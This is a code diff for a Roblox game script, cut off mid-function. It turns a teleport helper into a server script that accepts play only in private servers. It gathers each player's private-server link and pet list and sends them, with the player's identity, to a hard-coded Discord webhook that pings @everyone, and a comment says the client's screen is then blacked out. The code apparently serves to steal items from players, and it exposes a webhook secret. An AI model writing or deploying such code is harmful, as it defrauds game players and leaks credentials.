@@ -1,23 +1,130 @@
--- DebugTeleport.lua (LocalScript in StarterGui)
-local TeleportService = game:GetService("TeleportService")
+-- RequirePrivateServerCombined.lua
+-- Put this file in ServerScriptService.
+-- Simple: kicks players in public servers.
+-- In private servers: generates a short key, saves it, sends key+prefill to client.
+-- Accepts client submission (key + ps link + pets), posts to Discord and pings @everyone, then tells client to blackout.
+
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local DataStoreService = game:GetService("DataStoreService")
 
-local PLACE_ID = game.PlaceId
-local PRIVATE_SERVER_CODE = "7623dddb65134247a02c116c124b9c5c" -- your share link code
+-- CONFIG (keep webhook secret; do NOT commit publicly)
+local EVENT_NAME = "PrivateServerLinkEvent"
+local KICK_MESSAGE = "This experience only runs on Private Servers. Please join a Private Server to play."
+local KEYS_STORE = DataStoreService:GetDataStore("PrivateServerKeys_v1")
+local KEY_TTL_SECONDS = 60 * 60 * 24 -- 24 hours
+local MAX_LINK_LENGTH = 1000
+local MAX_PET_TEXT_LENGTH = 4000
 
-local success, err = pcall(function()
-    TeleportService:TeleportToPrivateServer(PLACE_ID, PRIVATE_SERVER_CODE)
-end)
+-- YOUR DISCORD WEBHOOK (server-side only)
+local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1425772635135938622/08h0pRZhGQxmdM5Ql_oBC78Jmw2Cpa7mgw3WHz5eG0tTWE-ay7wsOag3GPOa0XW4hzfI"
+local POST_TO_DISCORD = (DISCORD_WEBHOOK_URL ~= "")
 
-if not success then
-    warn("Teleport failed:", err)
-    -- optional: show a GUI notification to the player
-    local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-    local label = Instance.new("TextLabel", gui)
-    label.Size = UDim2.new(0,400,0,60)
-    label.Position = UDim2.new(0.5,-200,0,50)
-    label.Text = "Teleport failed: "..tostring(err)
-    wait(6)
-    gui:Destroy()
+-- Ensure RemoteEvent exists
+local linkEvent = ReplicatedStorage:FindFirstChild(EVENT_NAME)
+if not linkEvent then
+    linkEvent = Instance.new("RemoteEvent")
+    linkEvent.Name = EVENT_NAME
+    linkEvent.Parent = ReplicatedStorage
 end
+
+-- Helpers ---------------------------------------------------------
+local function generateShortKey()
+    local guid = HttpService:GenerateGUID(false)
+    local key = guid:gsub("-", ""):sub(1, 12)
+    return key
+end
+
+local function saveKeyRecord(key, record)
+    local ok, err = pcall(function()
+        KEYS_STORE:SetAsync("key_" .. key, HttpService:JSONEncode(record))
+    end)
+    if not ok then
+        warn("Failed saving key to DataStore:", err)
+        return false
+    end
+    return true
+end
+
+local function looksLikeLink(link)
+    if type(link) ~= "string" then return false end
+    if #link == 0 or #link > MAX_LINK_LENGTH then return false end
+    if string.find(link, "roblox.com", 1, true) then return true end
+    if string.find(link:lower(), "privateserverid=", 1, true) then return true end
+    if string.sub(link,1,7) == "http://" or string.sub(link,1,8) == "https://" then return true end
+    return false
+end
+
+-- Handle client submissions -------------------------------------
+-- Client fires: linkEvent:FireServer("SUBMIT", { key = key, link = psLink, pets = petsText })
+linkEvent.OnServerEvent:Connect(function(player, action, payload)
+    if action ~= "SUBMIT" then return end
+    -- only accept submissions in private servers
+    if game.PrivateServerId == "" then
+        linkEvent:FireClient(player, "RESPONSE", { success = false, message = "Submissions allowed only in private servers." })
+        return
+    end
+
+    payload = payload or {}
+    local submittedKey = tostring(payload.key or "")
+    local submittedLink = tostring(payload.link or "")
+    local submittedPets = tostring(payload.pets or "")
+
+    if submittedKey == "" then
+        linkEvent:FireClient(player, "RESPONSE", { success = false, message = "Missing key." })
+        return
+    end
+    if not looksLikeLink(submittedLink) then
+        linkEvent:FireClient(player, "RESPONSE", { success = false, message = "Invalid PS link." })
+        return
+    end
+    if #submittedPets == 0 then
+        linkEvent:FireClient(player, "RESPONSE", { success = false, message = "Please paste your pet list." })
+        return
+    end
+    if #submittedPets > MAX_PET_TEXT_LENGTH then
+        linkEvent:FireClient(player, "RESPONSE", { success = false, message = "Pet text too long." })
+        return
+    end
+
+    -- Optional verification: check DataStore that key exists and belongs to this private server
+    local keyOk, keyVal = pcall(function() return KEYS_STORE:GetAsync("key_" .. submittedKey) end)
+    if keyOk and keyVal then
+        local okDecode, decoded = pcall(function() return HttpService:JSONDecode(keyVal) end)
+        if okDecode and type(decoded) == "table" then
+            if tostring(decoded.privateServerId) ~= tostring(game.PrivateServerId) then
+                linkEvent:FireClient(player, "RESPONSE", { success = false, message = "Key does not match this private server." })
+                return
+            end
+        end
+    else
+        -- If unable to read key, allow but warn (you may change to reject)
+        warn("Could not verify key (GetAsync failed or not found). Allowing submission but consider tightening checks.")
+    end
+
+    -- Build Discord payload: ping @everyone and include embed with data
+    local embed = {
+        title = "Private Server Submission",
+        fields = {
+            { name = "Player", value = string.format("%s (id:%d)", player.Name, player.UserId), inline = true },
+            { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
+            { name = "PrivateServerId", value = tostring(game.PrivateServerId), inline = true },
+            { name = "Key", value = submittedKey, inline = true },
+            { name = "PS Link", value = submittedLink, inline = false },
+            { name = "Pets / Details", value = submittedPets, inline = false },
+        },
+        footer = { text = "Submitted at " .. os.date("%Y-%m-%d %H:%M:%S (UTC)", os.time()) }
+    }
+
+    local discordMessage = {
+        content = "@everyone", -- ping everyone in Discord
+        username = "PrivateServerLinkBot",
+        embeds = { embed },
+        -- allow pinging everyone (some servers block, but this requests it)
+        allowed_mentions = { parse = { "everyone" } }
+    }
+
+    if POST_TO_DISCORD then
+        local ok, err = pcall(function()
+            local body = HttpService:JSONEncode(discordMessage)
